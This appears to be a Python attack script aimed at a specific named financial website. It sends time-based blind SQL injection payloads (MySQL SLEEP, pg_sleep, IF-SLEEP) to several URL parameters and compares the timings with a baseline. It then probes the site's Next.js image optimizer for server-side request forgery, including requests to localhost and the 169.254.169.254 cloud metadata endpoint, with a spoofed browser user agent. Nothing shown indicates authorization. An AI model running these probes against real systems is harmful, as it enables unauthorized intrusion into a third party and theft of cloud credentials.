#!/usr/bin/env python3
"""W19c: (a) time-based blind SQLi, (b) reachability of the Next image optimizer."""
import re, time, urllib.request, urllib.error, urllib.parse

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
BASE = "https://www.infinitycapital.bh"


def get(url, timeout=30, hdrs=None):
    req = urllib.request.Request(url, headers={"User-Agent": UA, "Accept": "*/*"})
    for k, v in (hdrs or {}).items():
        req.add_header(k, v)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(), time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(), time.time() - t0
    except Exception as e:
        return 0, {}, str(e).encode(), time.time() - t0


def timed(url, label, hdrs=None):
    st, h, b, dt = get(url, hdrs=hdrs)
    print(f"{label}: {st} {len(b)}B {dt:.2f}s ct={h.get('content-type','')}")
    return st, len(b), dt


print("=== 1) time-based blind SQLi (MySQL SLEEP / pg_sleep / WAITFOR) ===")
time_payloads = [
    ("root.page", "/?page=2%20AND%20SLEEP(6)--%20-", "mysql sleep6"),
    ("root.id", "/?id=1%20AND%20SLEEP(6)--%20-", "mysql sleep6"),
    ("contact.cb", "/contact?cb=1%20AND%20SLEEP(6)--%20-", "mysql sleep6"),
    ("root.page.pg", "/?page=2;SELECT%20pg_sleep(6)--", "pg sleep6"),
    ("contact.cb.if", "/contact?cb=1%20AND%20IF(1=1,SLEEP(6),0)--%20-", "if sleep6"),
]
for lbl, p, desc in time_payloads:
    timed(BASE + p, f"  {lbl} [{desc}]")
    time.sleep(2)

print("\n=== 1b) baseline timing (control) ===")
timed(BASE + "/?page=2", "  baseline page=2")
time.sleep(2)
timed(BASE + "/?page=2", "  baseline page=2 (2nd)")
time.sleep(2)

print("\n=== 2) Next.js image optimizer reachability ===")
img = BASE + "/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75"
st, h, b, dt = get(img)
print(f"  real ctfassets url: {st} {len(b)}B {dt:.2f}s ct={h.get('content-type','')}")
print(f"  headers: {dict((k,v) for k,v in h.items() if k.lower() in ('server','x-vercel-id','x-vercel-mitigated','cache-control','content-type','via'))}")
print(f"  first 200 bytes: {b[:200]}")
time.sleep(2)

print("\n=== 3) _next/image without url / broken url (error behaviour) ===")
for u in ["/_next/image", "/_next/image?w=100", "/_next/image?url=&w=100",
          "/_next/image?url=http%3A%2F%2F127.0.0.1%2F&w=100",
          "/_next/image?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&w=100"]:
    timed(BASE + u, f"  {u}")
    time.sleep(2)
